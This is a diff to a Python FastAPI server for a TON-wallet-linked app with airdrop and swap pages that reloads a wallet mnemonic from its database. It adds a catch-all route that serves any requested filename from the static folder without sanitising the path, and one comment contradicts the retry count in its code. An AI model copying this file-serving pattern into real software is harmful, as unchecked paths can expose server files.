@@ -136,7 +136,7 @@ app.add_middleware(
     allow_headers=["*"]
 )
 
-# --- WEB ROUTES (Глобальные фиксы для Bothost) ---
+# --- WEB ROUTES (Фиксы 404 для Bothost) ---
 
 @app.get("/")
 @app.get("/index.html")
@@ -145,21 +145,6 @@ async def serve_index():
     if os.path.exists(path):
         return FileResponse(path)
     return JSONResponse({"error": "Index not found"}, status_code=404)
-
-@app.get("/tonconnect-manifest.json")
-async def serve_manifest():
-    path = os.path.join(overlord.get_static_path(), "tonconnect-manifest.json")
-    return FileResponse(path) if os.path.exists(path) else Response(status_code=404)
-
-@app.get("/favicon.ico")
-async def serve_favicon():
-    path = os.path.join(overlord.get_static_path(), "favicon.ico")
-    return FileResponse(path) if os.path.exists(path) else Response(status_code=404)
-
-@app.get("/images/{file_name}")
-async def serve_image(file_name: str):
-    path = os.path.join(overlord.get_static_path(), "images", file_name)
-    return FileResponse(path) if os.path.exists(path) else Response(status_code=404)
 
 @app.get("/admin")
 @app.get("/admin.html")
@@ -173,6 +158,24 @@ async def serve_admin():
         if os.path.exists(p):
             return FileResponse(p, headers={"Cache-Control": "no-store"})
     return JSONResponse({"status": "error", "message": "Admin file not found"}, status_code=404)
+
+# Умный роут для автоматического поиска файлов в корне static (airdrop, swap, style.css и т.д.)
+@app.get("/{filename}")
+async def serve_static_files(filename: str):
+    static_dir = overlord.get_static_path()
+    file_path = os.path.join(static_dir, filename)
+    
+    if os.path.exists(file_path) and os.path.isfile(file_path):
+        return FileResponse(file_path)
+    
+    # Поиск картинок, если запрашивают напрямую без /images/
+    if filename.endswith(('.png', '.jpg', '.svg', '.ico', '.json')):
+        img_path = os.path.join(static_dir, "images", filename)
+        if os.path.exists(img_path): return FileResponse(img_path)
+        manifest_path = os.path.join(static_dir, filename)
+        if os.path.exists(manifest_path): return FileResponse(manifest_path)
+
+    raise HTTPException(status_code=404)
 
 # --- API ---
 
@@ -210,21 +213,22 @@ async def handle_login(request: Request):
         return JSONResponse({"status": "error"}, status_code=401)
     except: return JSONResponse({"status": "error"}, status_code=400)
 
-# --- MOUNT & ASSETS ---
-static_path = overlord.get_static_path()
-if os.path.exists(static_path):
-    app.mount("/static", StaticFiles(directory=static_path), name="static")
-    log(f"STATIC: {static_path} примонтирован", "INFO")
+# --- MOUNT ---
+app.mount("/static", StaticFiles(directory=overlord.get_static_path()), name="static")
+log(f"STATIC: {overlord.get_static_path()} примонтирован", "INFO")
 
 # --- CORE WORKER ---
 async def core_worker():
-    while DB_ENABLED:
+    # Ожидание базы данных (максимум 5 попыток, чтобы не вешать сервер навсегда)
+    retry = 0
+    while DB_ENABLED and retry < 10:
         try:
             await init_db()
             log("DB: Connected Successfully", "SUCCESS")
             break
         except: 
-            log("DB: Waiting for connection...", "WARNING")
+            retry += 1
+            log(f"DB: Waiting for connection (Attempt {retry}/10)...", "WARNING")
             await asyncio.sleep(5)
 
     while overlord.is_active:
@@ -253,9 +257,8 @@ async def core_worker():
                         old_mne = overlord.mnemonic
                         await overlord.update_config_from_db()
                         if overlord.mnemonic != old_mne:
-                            log("CORE: Обнаружена новая мнемоника, перезапуск сессии...", "WARNING")
+                            log("CORE: Обнаружена новая мнемоника, перезапуск...", "WARNING")
                             break
-                        
                         await asyncio.sleep(30)
                     except Exception as e:
                         log(f"Heartbeat Error: {e}", "TRACE")
@@ -267,11 +270,4 @@ async def core_worker():
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 3000))
     log(f"SYSTEM: Quantum Overlord запущен на порту {port}", "CORE")
-    uvicorn.run(
-        app, 
-        host="0.0.0.0", 
-        port=port, 
-        proxy_headers=True, 
-        forwarded_allow_ips="*",
-        log_level="info"
-    )
+    uvicorn.run(app, host="0.0.0.0", port=port, proxy_headers=True, forwarded_allow_ips="*", log_level="info")
